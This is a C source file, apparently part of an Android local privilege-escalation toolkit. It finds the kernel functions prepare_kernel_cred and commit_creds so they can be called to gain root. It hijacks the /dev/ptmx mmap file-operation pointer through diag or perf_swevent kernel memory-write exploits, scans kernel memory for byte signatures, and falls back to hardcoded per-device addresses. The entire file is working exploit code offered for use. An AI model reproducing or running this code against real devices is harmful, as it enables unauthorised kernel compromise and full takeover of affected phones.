#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "cred.h"
#include "mm.h"
#include "perf_swevent.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int prepare_kernel_cred_address;
  unsigned long int commit_creds_address;
} supported_device;

static supported_device supported_devices[] = {
  { "IS17SH", "01.00.04", 0xc01c66a8, 0xc01c5fd8 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      if (prepare_kernel_cred_address) {
        *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
      }
      if (commit_creds_address) {
        *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
      }
      return true;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return false;
}

static uint32_t PAGE_OFFSET = 0xC0000000;

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

#define KERNEL_SIZE 0x10000000

static bool
find_creds_functions_with_mmap(void)
{
  int fd;
  void *address;
  void *start_address = (void*) 0x10000000;

  fd = open("/dev/ptmx", O_RDWR);
  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred(address, KERNEL_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, KERNEL_SIZE);

    prepare_kernel_cred = convert_to_kernel_address(prepare_kernel_cred, address);
    commit_creds = convert_to_kernel_address(commit_creds, address);
  }

  munmap(address, KERNEL_SIZE);

  close(fd);

  return prepare_kernel_cred && commit_creds;
}

static bool
find_with_diag_exploit(unsigned int ptmx_mmap_address)
{
  struct diag_values injection_data;
  bool success;

  injection_data.address = ptmx_mmap_address;
  injection_data.value = (uint16_t)&ptmx_mmap;

  if (!diag_inject(&injection_data, 1)) {
    return false;
  }

  success = find_creds_functions_with_mmap();

  injection_data.value = 3;
  return diag_inject(&injection_data, 1) && success;
}

static bool
find_with_perf_swevent_exploit(unsigned int ptmx_mmap_address)
{
  int number_of_children;
  bool success;

  number_of_children = perf_swevent_write_value_at_address(ptmx_mmap_address,
                                                           (unsigned long int)&ptmx_mmap);
  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  success = find_creds_functions_with_mmap();

  perf_swevent_reap_child_process(number_of_children);

  return success;
}

static bool
find_creds_functions_in_memory(void)
{
  unsigned long int ptmx_mmap_address;

  ptmx_mmap_address = get_ptmx_fops_address() + 0x28;

  if (diag_is_supported()) {
    return find_with_diag_exploit(ptmx_mmap_address);
  }
  return find_with_perf_swevent_exploit(ptmx_mmap_address);
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (find_creds_functions_in_memory()) {
    return true;
  }

  return get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds);
}

